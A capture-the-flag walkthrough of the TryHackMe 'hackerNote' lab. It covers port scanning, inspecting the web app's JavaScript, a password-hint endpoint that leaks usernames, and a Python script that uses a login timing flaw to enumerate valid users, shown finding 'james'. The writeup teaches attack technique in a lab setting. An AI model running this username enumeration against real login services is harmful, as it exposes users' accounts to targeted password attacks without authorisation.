# hackerNote — Writeup

## Enumeration
Start Machine
You're presented with a machine. Your first step should be recon. Scan the machine with nmap, work out what's running.
Answer the questions below
```json
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.247.168 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.247.168:22
Open 10.10.247.168:80
Open 10.10.247.168:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.247.168 [3 ports]
Discovered open port 80/tcp on 10.10.247.168
Discovered open port 8080/tcp on 10.10.247.168
Discovered open port 22/tcp on 10.10.247.168
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.247.168
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.247.168.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.247.168
Host is up, received user-set (0.21s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10a6953462b0562a38157758f4f36cac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f1827a4e7219d4e6d55b3acc52dd5d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2dc31b584dc35d8e6af6379dcaad207c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
```
Which ports are open? (in numerical order)
*22,80,8080*
What programming language is the backend written in?
Use nmap -sV to fingerprint the service version.
*Go*
### Investigate
Now that you know what's running, you need to investigate. With webapps, the normal process is to click around. Create an account, use the web app as a user would and play close attention to details.
Answer the questions below
```text
view-source:http://10.10.247.168/main.js

console.log("Hello, World!");
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: JSON.stringify(data) // body data type must match "Content-Type" header
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function getData(url = '') {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function whoami() {
    console.log(getData("/api/user/whoami"));
}

async function login() {
    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;
    const button = document.querySelector("#loginButton");
    button.disabled = true;
    document.querySelector("#status").textContent = "Logging you in..."
    const response = await postData("/api/user/login", { username: username, password: password });
    console.log(response);
    if (response.status !== undefined && response.status !== "success") {
        document.querySelector("#status").textContent = "";
        document.querySelector("#errorMessage").textContent = response.status
        button.disabled = false;
        return
    }
    if (response.SessionToken !== undefined) {
        window.location = "/notes"
    }
}
async function forgotPassword() {
    //Based on username, find return password hint
    var username = document.querySelector("#username").value;
    const response = await getData("/api/user/passwordhint/" + username)
    console.log(response)
    if (response.hint !== undefined && response.hint !== "success") {
        document.querySelector("#passwordHint").textContent = "Hint: "+response.hint
        return
    }
}
function getCookie(name) {
    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    return v ? v[2] : null;
}
function onLoad() {
    const session = getCookie("SessionToken");
    console.log(session)
    if (session !== null && session !== "") {
        window.location = "/notes"
    }
}
async function createUser() {
    const button = document.querySelector("#userCreateButton");
    const username = document.querySelector("#usernameCreate").value;
    const password = document.querySelector("#passwordCreate").value;
    const passwordHint = document.querySelector("#passwordHintCreate").value;
    const user = {
        Username: username,
        Password: password,
        PasswordHint: passwordHint
    };
    document.querySelector("#statusCreation").textContent = "Creating your account";
    button.disabled = true;
    const response = await postData("/api/user/create", user);
    console.log(response)
    if (response.status !== undefined) {
        if (response.status !== "success") {
            document.querySelector("#statusCreation").textContent = "";
            document.querySelector("#errorMessage").textContent = response.status
            return
        }
        document.querySelector("#statusCreation").textContent = "";
        document.querySelector("#statusCreation").textContent = "Successfully created a user account";
        document.querySelector("#usernameCreate").value = "";
        document.querySelector("#passwordCreate").value = "";
        document.querySelector("#passwordHintCreate").value = "";
        return
    }
    document.querySelector("#statusCreation").textContent = "";
    document.querySelector("#errorMessage").textContent = "Something went wrong..."
}

API

Invalid Username Or Password 

rot13 password reset

 Hint: ..

using burp

REQUEST

POST /api/user/login HTTP/1.1

Host: 10.10.247.168

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/json

Origin: http://10.10.247.168

Content-Length: 41

Connection: close

{"username":"wittya","password":"wittya"}

RESPONSE

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 16:06:42 GMT

Content-Length: 42

Connection: close

{"status":"Invalid Username Or Password"}

REQUEST

GET /api/user/passwordhint/witty HTTP/1.1

RESPONSE

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 16:07:48 GMT

Content-Length: 32

Connection: close

{"hint":"a","username":"witty"}
```
Create your own user account
Completed
Log in to your account
Completed
Try and log in to an invalid user account
Completed
Try and log in to your account, with an incorrect password.
Completed
Notice the timing difference. This allows user enumeration
There's another way to check if a username is valid on this webapp. Can you find it? Additional hint: cnffjbeq erfrg
Completed

## Exploitation
**Use the timing attack**
Now that we know there's a timing attack, we can write a python script to exploit it.
The first step is working out how login requests work. You can use Burpsuite for this, but I prefer to use Firefox dev tools as I don't have to configure any proxies.
Here we can see the login is a POST request to /api/user/login. This means we can make this request using CURL, python or another programming language of your choice.
![](https://i.imgur.com/swXlKKU.png)
In python, we can use this code and the Requests library to send this request as follows:
creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)
The next stage is timing this. Using the "time" standard library, we can work out the time difference between when we send the request and when we get a response. I've moved the login request into it's own function called doLogin.
startTime = time.time()
doLogin(user)
endTime = time.time()
The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.
**Why does the time taken change?**
The backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.
HackerNote Login Code
```python
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```
Pre-written exploits in Golang and Python are available here: [https://github.com/NinjaJc01/hackerNoteExploits](https://github.com/NinjaJc01/hackerNoteExploits)[](https://github.com/NinjaJc01/hackerNoteExploits)
Use the Honeypot capture or Names/names.txt from [https://github.com/danielmiessler/SecLists/tree/master/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames). The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)
**NOTE:** The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.
Answer the questions below
```text
┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ head names.txt              
witty
aaliyah
aaren
aarika
aaron
aartjan
aarushi
abagael
abagail
abahri

using burp intruder

GET /api/user/passwordhint/§witty§ HTTP/1.1

Host: 10.10.247.168

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cache-Control: max-age=0

Response
HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 17:09:25 GMT

Content-Length: 32

Connection: close

{"hint":"a","username":"witty"}

Response

HTTP/1.1 200 OK

Content-Type: application/json

Date: Thu, 16 Mar 2023 17:12:29 GMT

Content-Length: 74

Connection: close

{"hint":"My favourite colour and my favourite number","username":"james"}

We found another username james :) (2 min)

┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ cat hackernote.py  
#!/usr/bin/env python3
import sys
import requests
import time

def main():
    host = '10.10.247.168'

    with open(sys.argv[1]) as f:
        usernames = f.readlines()
    usernames = [x.strip() for x in usernames] 

    for username in usernames:
        start = time.time()
        creds = {"username":username,"password":"notimportant"}
        r = requests.post("http://{}/api/user/login".format(host), data=creds)
        done = time.time()
        elapsed = done - start
        if elapsed > 1.2:
            print("[*] Valid user found: {}".format(username))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
        sys.exit(1) 
    main()

┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ sudo nano j_names.txt  
                                                                                    
┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
└─$ more j_names.txt 
witty
jaan
jabir
jacalyn
jace
jacek
jacenta
jacinda
jacinta
jacintha
jacinthe
jack
jackelyn
jacki
jackie
jacklin
jacklyn
jackquelin
jackqueline
jackson
jacky
jaclin
jaclyn
jacob
jacoby
jacque
jacquelin
jacqueline
jacquelyn
jacquelynn
jacquenetta
jacquenette
jacques
jacquetta
jacquette
jacqui
jacquie
jacynth
jacynthe
jad
jada
jade
jaden
jadon
jadyn
jae
jaelynn
jaffer
jag
jagat
jagdev
jagdish
jagger
jagjeet
jagjit
jago
jagriti
jai
jaida
jaiden
jaime
jaimie
jaina
jaine
jak
jake
jakob
jalen
jamal
jaman
james
james_michael
